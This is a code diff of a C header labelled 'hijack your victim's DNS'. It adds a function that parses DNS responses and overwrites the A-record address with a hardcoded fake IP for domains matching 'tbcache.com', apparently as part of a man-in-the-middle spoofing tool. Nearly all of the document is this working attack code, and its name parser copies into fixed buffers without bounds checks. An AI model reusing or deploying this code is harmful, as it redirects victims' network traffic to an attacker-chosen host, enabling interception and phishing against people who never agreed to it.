@@ -1,6 +1,6 @@
 /*
 * MODULE: hijack your victim's DNS
-* MAIN FUNCTION: Dnshijack
+* MAIN FUNCTION: DNSHijack
 * LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
 */
 
@@ -8,6 +8,9 @@
 #define __DNS_HIJACK_H_
 
 #include "head.h"
+
+#define DNS_A  0x01
+#define DNS_CNAME 0x05
 
 typedef struct {
     u_short id;
@@ -18,37 +21,92 @@ typedef struct {
     u_short num_appendix;
 } dns_header;
 
-void DnshijackV(const u_char *dns, int len) {
-    dns_header *pDns = (dns_header *)dns;
-    char data[64];
-    u_short type;
-    u_short classes;
-    memcpy(data, (char *)dns + 12, len - 16);
-    memcpy(&type, (char *)dns + len - 3, 2);
-    memcpy(&classes, (char *)dns + len - 1, 2);
-    printf("Analyze DNS:\n");
-    printf("ID: %u\n", ntohs(pDns->id));
-    printf("Tag: %u\n", ntohs(pDns->tag));
-    printf("Que_n: %u\n", ntohs(pDns->num_question));
-    printf("Ans_n: %u\n", ntohs(pDns->num_answer));
-    printf("Aut_n: %u\n", ntohs(pDns->num_authority));
-    printf("App_n:%u\n\n", ntohs(pDns->num_appendix));
-    printf("DNS contains:\n");
-    printf("len: %d\n",len - 12);
-    printf("Qname: %s\n", data);
-    printf("Qtype: %x\n", type);
-    printf("Qclass: %x\n\n", classes);
+/* get domain name in the buf */
+void parse_dns_name(u_char *buf, u_char *p, char *name, int *len) {
+
+    int flag;
+    char *pos = name + *len;
+
+    while (1) {
+
+        /* end */
+        flag = (int)p[0];
+        if (flag == 0)
+            break;
+
+        /* judge pointers */
+        if ((flag & 0xc0) == 0xc0) {
+            p = buf + (int)p[1];
+            parse_dns_name(buf, p, name, len);
+            break;
+        }
+        /* copy */
+        else {
+            p += 1;
+            memcpy(pos, p, flag);
+            pos += flag;
+            p += flag;
+            *len += flag;
+            if ((int)p[0] != 0) {
+                memcpy(pos, ".", 1);
+                pos += 1;
+                *len += 1;
+            }
+        }
+    }
 }
 
-void DnshijackG(const u_char *dns, int len) {
-    u_char data[64];
-    memcpy(data, dns + 12, 30);
-    printf("Analyze DNS:\n");
-    printf("len: %d\n",len - 12);
-    printf("Qname: %s\n", data);
-    u_long ip = 0x2A324E2D;
-    memcpy((void*)(dns + len - 4), &ip, 4);
-    print_ip((u_char *)(dns + len - 4));
+int DNSHijack(u_char *buf) {
+
+    /* definations */
+    dns_header DNS;
+    char cname[128] , aname[128] , ip[20];
+    u_char netip[4];
+    int count, len, type, data_len;
+    u_char fake_ip[4] = {45,78,50,42};
+
+    /* parse head */
+    memcpy(&DNS, buf, 12);
+    u_char *p = buf + 12;
+
+    /* move over questions */
+    int flag;
+    for (count = 0; count < ntohs(DNS.num_question); count++) {
+        while (1) {
+            flag = (int)p[0];
+            p += (flag + 1);
+            if (flag == 0)
+                break;
+        }
+        p += 4;
+    }
+
+    /* parse answers */
+    //printf("\nGet DNS response:\n");
+    for (count = 0; count < ntohs(DNS.num_answer); count++) {
+        bzero(aname , sizeof(aname));
+        len = 0;
+        parse_dns_name(buf , p , aname , &len);
+        p += 2;
+        type = htons(*((u_short*)p));
+		p += 8;
+		data_len = ntohs(*((u_short*)p));
+		p += 2;
+
+        if (type == DNS_A) {
+            bzero(ip , sizeof(ip));
+            if (data_len == 4 && strstr(aname, "tbcache.com") != NULL) {
+                memcpy(p, fake_ip, 4);
+                memcpy(netip, p, data_len);
+                inet_ntop(AF_INET, netip, ip, sizeof(struct sockaddr));
+                printf("Domain name: %s\n", aname);
+                printf("IP address: %s\n", ip);
+            }
+        }
+        p += data_len;
+    }
+    return 0;
 }
+
 
 #endif
